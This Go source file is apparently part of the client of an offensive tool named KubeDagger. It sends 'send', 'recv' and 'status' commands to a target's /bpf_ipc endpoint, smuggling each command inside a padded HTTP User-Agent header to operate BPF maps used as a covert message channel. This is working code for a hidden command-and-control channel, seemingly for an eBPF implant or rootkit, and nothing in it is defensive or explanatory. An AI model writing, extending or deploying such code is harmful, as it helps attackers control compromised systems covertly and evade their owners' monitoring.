package bpf_ipc

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type IPCResult struct {
	Action  string       `json:"action"`
	Actions []ActionInfo `json:"actions"`
	Success bool         `json:"success"`
}

type ActionInfo struct {
	Name   string `json:"name"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func Execute(target, action, channel, message, output string) error {
	var result *IPCResult

	switch action {
	case "send":
		result = sendMessage(target, channel, message)
	case "recv":
		result = recvMessage(target, channel)
	case "status":
		result = channelStatus(target, channel)
	default:
		return fmt.Errorf("unsupported action: %s (use send, recv, or status)", action)
	}

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func sendMessage(target, channel, message string) *IPCResult {
	result := &IPCResult{Action: "send"}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"acquire_map_fd",
			"obtain file descriptor for BPF ringbuf map used as IPC mailbox",
			"bpf_ipc_acquire_map",
		},
		{
			"write_message",
			"write message payload into BPF map slot for the target channel",
			"bpf_ipc_write_msg",
		},
		{
			"signal_receiver",
			"update sequence counter to notify receiving BPF program of new data",
			"bpf_ipc_signal",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + channel + "#" + message
		status := sendCmd(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)
	return result
}

func recvMessage(target, channel string) *IPCResult {
	result := &IPCResult{Action: "recv"}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"poll_map_slot",
			"read BPF map slot for pending messages on the specified channel",
			"bpf_ipc_poll",
		},
		{
			"consume_message",
			"mark message as consumed and return payload to userspace",
			"bpf_ipc_consume",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + channel
		status := sendCmd(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)
	return result
}

func channelStatus(target, channel string) *IPCResult {
	result := &IPCResult{Action: "status"}

	cmd := "bpf_ipc_status#" + channel
	status := sendCmd(target, cmd)
	result.Actions = append(result.Actions, ActionInfo{
		Name:   "query_channel_status",
		Status: status,
		Detail: "query BPF map for channel state, pending messages, and sequence numbers",
	})

	result.Success = allSucceeded(result.Actions)
	return result
}

func sendCmd(target, command string) string {
	ua := buildUserAgent(command)

	req, err := http.NewRequest("GET", target+"/bpf_ipc", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "enabled"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func allSucceeded(actions []ActionInfo) bool {
	for _, a := range actions {
		if !strings.HasPrefix(a.Status, "enabled") {
			return false
		}
	}
	return true
}
